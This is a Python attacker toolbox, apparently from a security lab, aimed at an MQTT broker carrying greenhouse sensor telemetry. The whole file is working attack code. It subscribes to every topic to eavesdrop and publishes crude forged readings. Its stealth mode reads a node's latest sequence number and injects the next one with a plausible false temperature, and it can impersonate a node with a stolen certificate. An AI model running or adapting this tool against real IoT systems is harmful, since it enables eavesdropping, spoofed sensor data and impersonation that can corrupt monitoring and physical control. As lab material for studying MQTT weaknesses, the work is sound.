"""Attacker toolbox (lab only, against the lab broker).
  sniff    subscribe to '#' for N seconds and count what an outsider can read
  crude    publish an obviously impossible reading as node1 (temp 95, seq 0)
  stealth  sniff the latest seq of node1, then forge seq+1 with a plausible but wrong temperature
  --as     certificate to present: none (default) | stolen (a captured node2 certificate)"""
import argparse, json, sys, time
from common import make_client, connect, TLS

ap = argparse.ArgumentParser()
ap.add_argument("mode", choices=["sniff", "crude", "stealth"])
ap.add_argument("--as", dest="ident", default="none")
ap.add_argument("--target", default="node1")
ap.add_argument("--secs", type=float, default=8)
ap.add_argument("--count", type=int, default=5)
ap.add_argument("--delta", type=float, default=4.0, help="stealth: degrees added to the last real temperature")
a = ap.parse_args()

c = make_client("attacker", cert=None if a.ident == "none" else a.ident)
seen = {"n": 0, "topics": set(), "last": {}}


def on_message(cl, ud, msg):
    seen["n"] += 1
    seen["topics"].add(msg.topic)
    try:
        seen["last"][msg.topic] = json.loads(msg.payload)
    except Exception:
        pass


c.on_message = on_message
ok, why = connect(c, tries=1, wait=5)
if not ok:
    print(f"RESULT connect_failed ({a.ident}): {why}"); sys.exit(0)
c.subscribe("#", qos=0)
if a.mode == "sniff":
    time.sleep(a.secs)
    print(f"RESULT connected ({a.ident}); received {seen['n']} messages on {len(seen['topics'])} topics")
    if seen["last"]:
        t, v = next(iter(seen["last"].items()))
        print("example:", t, json.dumps(v))
    sys.exit(0)

topic = f"greenhouse/{a.target}/telemetry"
if a.mode == "stealth":                       # needs readable traffic (works only if '#' returns data)
    time.sleep(3)
    last = seen["last"].get(topic)
    if not last:
        print(f"RESULT connected ({a.ident}) but could not read {a.target} traffic; falling back to blind forgery")
        last = {"seq": 100000, "temp": 24.0, "hum": 60.0, "soil": 35.0}
for i in range(a.count):
    if a.mode == "crude":
        d = {"node": a.target, "seq": 0, "ts": time.time(), "temp": 95.0, "hum": 20.0, "soil": 2.0, "fw": 1, "src": "attacker"}
    else:
        d = {"node": a.target, "seq": last["seq"] + 1 + i, "ts": time.time(), "temp": round(last["temp"] + a.delta, 2),
             "hum": last["hum"], "soil": last["soil"], "fw": 1, "src": "attacker"}
    c.publish(topic, json.dumps(d), qos=1).wait_for_publish(3)
    time.sleep(0.4)
print(f"RESULT connected ({a.ident}); sent {a.count} forged '{a.mode}' readings to {topic}")
c.disconnect()
